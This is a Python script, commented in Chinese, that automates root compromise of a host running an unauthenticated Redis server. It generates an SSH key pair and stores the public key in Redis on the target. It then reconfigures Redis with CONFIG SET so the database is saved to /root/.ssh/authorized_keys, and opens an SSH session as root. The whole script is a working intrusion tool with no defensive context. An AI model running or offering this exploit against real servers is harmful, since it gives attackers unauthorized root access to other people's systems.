import os
import platform
import redis


# 检查操作系统类型
def is_windows():
    return platform.system().lower() == "windows"


# 1. 生成SSH密钥对
def generate_ssh_key():
    key_dir = os.path.expanduser("~/.ssh")
    if not os.path.exists(key_dir):
        os.makedirs(key_dir)

    key_path = os.path.join(key_dir, "id_rsa")
    pub_key_path = key_path + ".pub"

    # 使用ssh-keygen生成密钥对
    ssh_keygen_command = f'ssh-keygen -t rsa -f {key_path} -N ""'
    os.system(ssh_keygen_command)
    print(f"SSH密钥已生成，并保存到: {key_path}")
    return pub_key_path


# 2. 将公钥保存到key.txt文件，并导入到Redis中
def save_key_to_redis(pub_key_path, redis_host):
    with open("key.txt", "w") as key_file:
        key_file.write("\n\n")
        with open(pub_key_path, "r") as pub_key_file:
            key_file.write(pub_key_file.read())
        key_file.write("\n\n")

    with open("key.txt", "r") as key_file:
        pub_key_data = key_file.read()

    # 使用 redis-py 将公钥写入 Redis
    r = redis.Redis(host=redis_host, port=6379, decode_responses=True)
    r.set("xxx", pub_key_data)

    print("公钥已保存到Redis并写入key.txt文件。")


# 3. 配置Redis以将公钥写入目标主机
def configure_redis_for_ssh(redis_host):
    r = redis.Redis(host=redis_host, port=6379, decode_responses=True)

    r.config_set("dir", "/root/.ssh")
    r.config_set("dbfilename", "authorized_keys")
    r.save()

    print("Redis配置已更新，SSH公钥已保存到目标主机。")


# 4. 使用系统命令连接SSH
def ssh_connect(redis_host):
    key_path = os.path.expanduser("~/.ssh/id_rsa")
    ssh_command = f'ssh -i {key_path} root@{redis_host}'

    # 打印即将执行的SSH命令
    print(f"正在尝试连接目标主机 {redis_host}...")

    # 使用系统命令连接SSH
    os.system(ssh_command)


if __name__ == "__main__":
    # 交互式获取目标IP地址
    redis_host = input("请输入目标主机的IP地址: ")

    # 1. 生成SSH密钥对
    pub_key_path = generate_ssh_key()

    # 2. 将公钥保存到key.txt并导入Redis
    save_key_to_redis(pub_key_path, redis_host)

    # 3. 配置Redis以将公钥写入目标主机的authorized_keys
    configure_redis_for_ssh(redis_host)

    # 4. 使用系统命令连接SSH
    ssh_connect(redis_host)
